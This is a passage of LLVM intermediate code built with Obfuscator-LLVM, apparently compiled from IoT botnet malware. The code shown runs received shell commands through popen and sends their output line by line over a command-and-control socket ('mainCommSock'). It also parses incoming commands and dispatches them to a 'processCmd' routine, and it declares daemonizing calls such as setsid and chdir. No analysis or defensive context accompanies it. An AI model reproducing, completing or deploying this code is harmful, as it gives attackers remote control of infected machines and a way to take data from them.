  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %283
  br label %81

; <label>:287:                                    ; preds = %283
  %288 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %288, i8 0, i64 1024, i32 16, i1 false)
  %289 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %290 = load i8*, i8** %14, align 8
  %291 = call i32 (i8*, i8*, ...) @szprintf(i8* %289, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.84, i32 0, i32 0), i8* %290)
  %292 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %293 = call i32 @fdpopen(i8* %292, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0))
  store i32 %293, i32* %19, align 4
  br label %294

; <label>:294:                                    ; preds = %299, %287
  %295 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %296 = load i32, i32* %19, align 4
  %297 = call i8* @fdgets(i8* %295, i32 1024, i32 %296)
  %298 = icmp ne i8* %297, null
  br i1 %298, label %299, label %306

; <label>:299:                                    ; preds = %294
  %300 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %300)
  %301 = load i32, i32* @mainCommSock, align 4
  %302 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %303 = call i32 (i32, i8*, ...) @sockprintf(i32 %301, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.85, i32 0, i32 0), i8* %302)
  %304 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %304, i8 0, i64 1024, i32 16, i1 false)
  %305 = call i32 @sleep(i32 1)
  br label %294

; <label>:306:                                    ; preds = %294
  %307 = load i32, i32* %19, align 4
  %308 = call i32 @fdpclose(i32 %307)
  call void @exit(i32 0) #14
  unreachable

; <label>:309:                                    ; preds = %279
  store i32 1, i32* %21, align 4
  %310 = load i8*, i8** %14, align 8
  %311 = call i8* @strtok(i8* %310, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %311, i8** %22, align 8
  %312 = load i8*, i8** %16, align 8
  %313 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 0
  store i8* %312, i8** %313, align 16
  br label %314

; <label>:314:                                    ; preds = %345, %309
  %315 = load i8*, i8** %22, align 8
  %316 = icmp ne i8* %315, null
  br i1 %316, label %317, label %347

; <label>:317:                                    ; preds = %314
  %318 = load i8*, i8** %22, align 8
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp ne i32 %320, 10
  br i1 %321, label %322, label %345

; <label>:322:                                    ; preds = %317
  %323 = load i8*, i8** %22, align 8
  %324 = call i64 @strlen(i8* %323) #10
  %325 = add i64 %324, 1
  %326 = call noalias i8* @malloc(i64 %325) #4
  %327 = load i32, i32* %21, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %328
  store i8* %326, i8** %329, align 8
  %330 = load i32, i32* %21, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  %334 = load i8*, i8** %22, align 8
  %335 = call i64 @strlen(i8* %334) #10
  %336 = add i64 %335, 1
  call void @llvm.memset.p0i8.i64(i8* %333, i8 0, i64 %336, i32 1, i1 false)
  %337 = load i32, i32* %21, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %338
  %340 = load i8*, i8** %339, align 8
  %341 = load i8*, i8** %22, align 8
  %342 = call i8* @strcpy(i8* %340, i8* %341) #4
  %343 = load i32, i32* %21, align 4
  %344 = add nsw i32 %343, 1
  store i32 %344, i32* %21, align 4
  br label %345

; <label>:345:                                    ; preds = %322, %317
  %346 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %346, i8** %22, align 8
  br label %314

; <label>:347:                                    ; preds = %314
  %348 = load i32, i32* %21, align 4
  %349 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i32 0, i32 0
  call void @processCmd(i32 %348, i8** %349)
  %350 = load i32, i32* %21, align 4
  %351 = icmp sgt i32 %350, 1
  br i1 %351, label %352, label %366

; <label>:352:                                    ; preds = %347
  store i32 1, i32* %23, align 4
  store i32 1, i32* %23, align 4
  br label %353

; <label>:353:                                    ; preds = %362, %352
  %354 = load i32, i32* %23, align 4
  %355 = load i32, i32* %21, align 4
  %356 = icmp slt i32 %354, %355
  br i1 %356, label %357, label %365

; <label>:357:                                    ; preds = %353
  %358 = load i32, i32* %23, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %359
  %361 = load i8*, i8** %360, align 8
  call void @free(i8* %361) #4
  br label %362

; <label>:362:                                    ; preds = %357
  %363 = load i32, i32* %23, align 4
  %364 = add nsw i32 %363, 1
  store i32 %364, i32* %23, align 4
  br label %353

; <label>:365:                                    ; preds = %353
  br label %366

; <label>:366:                                    ; preds = %365, %347
  br label %367

; <label>:367:                                    ; preds = %366, %179
  br label %81

; <label>:368:                                    ; preds = %81
  %369 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.87, i32 0, i32 0))
  br label %71
                                                  ; No predecessors!
  %371 = load i32, i32* %3, align 4
  ret i32 %371
}

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @printf(i8*, ...) #5

declare i32 @sleep(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146633309}
!2 = !{i32 -2146632618}
!3 = !{i32 -2146631869}
!4 = !{i32 -2146631046}
!5 = !{i32 -2146630236}
!6 = !{i32 -2146628811}
!7 = !{i32 -2146627949}
!8 = !{i32 -2146627228}
